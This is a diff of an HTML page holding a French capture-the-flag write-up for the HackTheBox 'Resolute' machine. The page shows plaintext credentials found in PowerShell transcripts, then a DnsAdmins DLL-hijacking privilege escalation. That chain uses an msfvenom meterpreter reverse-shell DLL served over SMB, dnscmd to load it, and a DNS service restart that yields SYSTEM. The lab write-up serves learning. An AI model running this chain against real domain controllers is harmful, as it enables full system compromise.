-<p>La suite de l&rsquo;énumération se passe au niveau des fichiers de la machine. Après plusieurs tentatives de récupération d&rsquo;information, on réussit à récupérer le compte utilisateur de ryan, laissé dans un fichier.</p>
-
-<pre><code class="language-bash">PS &gt; findstr /si ryan *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs
-
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS&gt;ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS megabank\ryan@RESOLUTE Documents&gt;
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
-PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
-findstr.exe : FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
-    + CategoryInfo          : NotSpecified: (FINDSTR: Cannot...dGC\diagerr.xml:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
-FINDSTR: Cannot open Windows\PLA\System\System Diagnostics.xml
-FINDSTR: Cannot open Windows\PLA\System\System Performance.xml
-FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagerr.xml
-FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagwrn.xml
-</code></pre>
-
-<p>En modifiant le script WinRM utilisé auparavant, on peut récupérer un shell avec notre nouvel utilisateur.</p>
-
-<pre><code class="language-bash">PS &gt; whoami
-megabank\ryan
+PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK<span style="color:#ae81ff">\r</span>yan
+PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK<span style="color:#ae81ff">\r</span>yan
+PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS&gt;ParameterBinding<span style="color:#f92672">(</span>Out-String<span style="color:#f92672">)</span>: name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;InputObject&#34;</span>; value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PS megabank\ryan@RESOLUTE Documents&gt; &#34;</span>
+PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS megabank<span style="color:#ae81ff">\r</span>yan@RESOLUTE Documents&gt;
+PSTranscripts<span style="color:#ae81ff">\2</span>0191203<span style="color:#ae81ff">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:&gt;&gt; ParameterBinding<span style="color:#f92672">(</span>Invoke-Expression<span style="color:#f92672">)</span>: name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Command&#34;</span>; value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
+</span><span style="color:#e6db74">PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
+</span><span style="color:#e6db74">findstr.exe : FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
+</span><span style="color:#e6db74">    + CategoryInfo          : NotSpecified: (FINDSTR: Cannot...dGC\diagerr.xml:String) [], RemoteException
+</span><span style="color:#e6db74">    + FullyQualifiedErrorId : NativeCommandError
+</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
+</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\PLA\System\System Diagnostics.xml
+</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\PLA\System\System Performance.xml
+</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagerr.xml
+</span><span style="color:#e6db74">FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagwrn.xml
+</span></code></pre></div><p>En modifiant le script WinRM utilisé auparavant, on peut récupérer un shell avec notre nouvel utilisateur.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; whoami
+megabank<span style="color:#ae81ff">\r</span>yan
 PS &gt; pwd
 
 Path                   
 ----                   
-C:\Users\ryan\Documents
-</code></pre>
-
-<h2 id="escalade-de-privilège-dll-hijacking">Escalade de privilège - DLL Hijacking</h2>
-
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments
+</code></pre></div><h2 id="escalade-de-privilège---dll-hijacking">Escalade de privilège - DLL Hijacking</h2>
 <p>Quelques recherches Internet nous apprennent un moyen de réaliser une escalade de privilège sur une machine Windows pour un utilisateur étant membre du groupe <code>DnsAdmins</code>.</p>
-
 <p>Il est en effet possible de faire charger la DLL de notre choix par le service DNS. Cette dernière sera par la suite exécutée avec les droits SYSTEM.</p>
-
-<p>Les ressources suivantes expliquent la vulnérabilité :
-- <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a>
-- <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></p>
-
+<p>Les ressources suivantes expliquent la vulnérabilité :</p>
+<ul>
+<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></li>
+<li><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></li>
+</ul>
 <p>Première étape, générer une DLL contenant un reverse shell vers notre machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.28 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">5566</span> -f dll &gt; privesc.dll
 
-<pre><code class="language-bash">$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &gt; privesc.dll
-
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No encoder or badchars specified, outputting raw payload
-Payload size: 510 bytes
-Final size of dll file: 5120 bytes
-</code></pre>
+Payload size: <span style="color:#ae81ff">510</span> bytes
+Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
+</code></pre></div><p>On créé par la suite un server SMB temporaire, nous permettant de charger à distance la DLL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo smbserver.py MYSHARE /path/to/HackTheBox/Resolute -smb2support
+Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
 
-<p>On créé par la suite un server SMB temporaire, nous permettant de charger à distance la DLL.</p>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
 
-<pre><code class="language-bash">$ sudo smbserver.py MYSHARE /path/to/HackTheBox/Resolute -smb2support
-Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright 2020 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
-
-</code></pre>
-
-<p>Dernière étape de préparation, on lance notre handler afin de récupérer la connexion entrante.
+</code></pre></div><p>Dernière étape de préparation, on lance notre handler afin de récupérer la connexion entrante.
 Une fois cela fait, l&rsquo;exploitation est plutôt rapide et doit être rapide. En effet, je ne suis pas en mesure de dire si cela vient d&rsquo;un éventuel antivirus sur la machine ayant détecté notre DLL malveillante, ou une simple configuration afin de rendre la machine accessible à tous, mais il s&rsquo;avère que chaque utilisateur semble disposer d&rsquo;un temps limité pour exploiter la vulnérabilité une fois la clé de registre mise en place. Après un certain temps, celle ci est nettoyée.</p>
-
 <p>Bien ! La première étape est d&rsquo;indiquer au serveur DNS d&rsquo;aller chercher notre DLL malveillante.</p>
-
-<pre><code class="language-bash">PS &gt; dnscmd 10.10.10.169 /config /serverlevelplugindll \\10.10.14.28\TESTLOL\privesc.dll
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; dnscmd 10.10.10.169 /config /serverlevelplugindll <span style="color:#ae81ff">\\</span>10.10.14.28<span style="color:#ae81ff">\T</span>ESTLOL<span style="color:#ae81ff">\p</span>rivesc.dll
 
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
-</code></pre>
+</code></pre></div><p>On peut confirmer le succès de la commande en allant inspecter la clé de registre associée.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; Get-ItemProperty HKLM:<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS<span style="color:#ae81ff">\P</span>arameters<span style="color:#ae81ff">\ </span>-Name ServerLevelPluginDll
 
-<p>On peut confirmer le succès de la commande en allant inspecter la clé de registre associée.</p>
-
-<pre><code class="language-bash">PS &gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
-
-ServerLevelPluginDll : \\10.10.14.28\TESTLOL\privesc.dll
-PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
-PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
+ServerLevelPluginDll : <span style="color:#ae81ff">\\</span>10.10.14.28<span style="color:#ae81ff">\T</span>ESTLOL<span style="color:#ae81ff">\p</span>rivesc.dll
+PSPath               : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry::HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS<span style="color:#ae81ff">\P</span>arameters<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>PSParentPath         : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry::HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS
 PSChildName          : Parameters
 PSDrive              : HKLM
-PSProvider           : Microsoft.PowerShell.Core\Registry
-</code></pre>
-
-<p>Par la suite, il est nécessaire de redémarrer le service DNS afin de charger la DLL.</p>
-
-<pre><code class="language-bash">PS &gt; sc.exe stop dns
+PSProvider           : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry
+</code></pre></div><p>Par la suite, il est nécessaire de redémarrer le service DNS afin de charger la DLL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe stop dns
 
 SERVICE_NAME: dns 
-        TYPE               : 10  WIN32_OWN_PROCESS  
-        STATE              : 3  STOP_PENDING 
-                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
+        STATE              : <span style="color:#ae81ff">3</span>  STOP_PENDING 
+                                <span style="color:#f92672">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#f92672">)</span>
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
-</code></pre>
-
-<pre><code class="language-bash">PS &gt; sc.exe query dns
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe query dns
 
 SERVICE_NAME: dns 
-        TYPE               : 10  WIN32_OWN_PROCESS  
-        STATE              : 1  STOPPED 
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
+        STATE              : <span style="color:#ae81ff">1</span>  STOPPED 
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
-</code></pre>
-
-<pre><code class="language-bash">PS &gt; sc.exe start dns
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe start dns
 
 SERVICE_NAME: dns 
-        TYPE               : 10  WIN32_OWN_PROCESS  
-        STATE              : 2  START_PENDING 
-                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
+        STATE              : <span style="color:#ae81ff">2</span>  START_PENDING 
+                                <span style="color:#f92672">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#f92672">)</span>
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x7d0
-        PID                : 3340
+        PID                : <span style="color:#ae81ff">3340</span>
         FLAGS              : 
 
-</code></pre>
+</code></pre></div><p>Entre temps, on récupère un joli meterpreter :).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">206403</span> bytes<span style="color:#f92672">)</span> to 10.10.10.169
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.28:5566 -&gt; 10.10.10.169:63985<span style="color:#f92672">)</span> at 2020-02-22 17:02:49 +0100
 
-<p>Entre temps, on récupère un joli meterpreter :).</p>
-
-<pre><code class="language-bash">msf5 exploit(multi/handler) &gt; 
-[*] Sending stage (206403 bytes) to 10.10.10.169
-[*] Meterpreter session 1 opened (10.10.14.28:5566 -&gt; 10.10.10.169:63985) at 2020-02-22 17:02:49 +0100
-
-msf5 exploit(multi/handler) &gt; sessions 1
-[*] Starting interaction with 1...
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...
 
 meterpreter &gt; shell
-Process 3288 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
+Process <span style="color:#ae81ff">3288</span> created.
+Channel <span style="color:#ae81ff">1</span> created.
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32&gt;c
-</code></pre>
-
-<p>Nous permettant ainsi de compromettre entièrement la machine et d&rsquo;aller chercher le flag root !</p>
-
-<pre><code class="language-bash">C:\Users\Administrator\Desktop&gt;whoami
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;c
+</code></pre></div><p>Nous permettant ainsi de compromettre entièrement la machine et d&rsquo;aller chercher le flag root !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;whoami
 whoami
-nt authority\system
+nt authority<span style="color:#ae81ff">\s</span>ystem
 
-C:\Users\Administrator\Desktop&gt;hostname
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;hostname
 hostname
 Resolute
 
-</code></pre>
-
-<p>w00ted !</p>
+</code></pre></div><p>w00ted !</p>
   </div>
   
 
@@ -601,7 +560,7 @@ Resolute
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
